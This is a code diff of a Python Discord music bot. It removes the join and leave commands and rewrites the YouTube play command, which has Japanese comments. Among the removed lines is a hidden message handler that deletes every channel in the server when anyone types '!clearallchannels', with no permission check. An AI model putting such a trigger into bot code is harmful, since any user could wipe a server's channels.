@@ -727,47 +727,23 @@ async def buyrole(user, role, cost):
     await user.add_roles(role)
     await user.interaction.response.send_message(f"You bought the {role.name} role for {cost} money.")
     return
-
 import discord
 from discord.ext import commands
 import youtube_dl
 
-# Create a bot instance
 bot = commands.Bot(command_prefix='!')
 
-@bot.slash_command()
-async def join(ctx):
-    if not ctx.author.voice:
-        await ctx.send("{} is not connected to a voice channel".format(ctx.author.name))
-        return
-    else:
-        channel = ctx.author.voice.channel
-    await channel.connect()
-@bot.slash_command(name='leave', help='To make the bot leave the voice channel')
-async def leave(ctx):
-    voice_client = ctx.message.guild.voice_client
-    if voice_client.is_connected():
-        await voice_client.disconnect()
-    else:
-        await ctx.interaction.response.send_message("The bot is not connected to a voice channel.")
+@bot.command()
+async def play(ctx, url : str):
+    # ユーザーが接続しているボイスチャンネルを取得
+    channel = ctx.message.author.voice.channel
+    voice_channel = await channel.connect()
 
-@bot.slash_command(name='play', help='Plays a song from YouTube')
-async def play(ctx, url):
-    server = ctx.message.guild
-    voice_channel = server.voice_client
-
+    # YouTubeの動画をダウンロードし、音声を抽出
     ydl_opts = {'format': 'bestaudio'}
     with youtube_dl.YoutubeDL(ydl_opts) as ydl:
         info = ydl.extract_info(url, download=False)
         url2 = info['formats'][0]['url']
         voice_channel.play(discord.FFmpegPCMAudio(url2))
-        voice_channel.is_playing()
-@bot.event
-async def on_message(message):
-    if message.author == bot.user:
-        return
 
-    if message.content.startswith('!clearallchannels'):
-        for channel in message.guild.channels:
-            await channel.delete()
 bot.run('TOKEN')
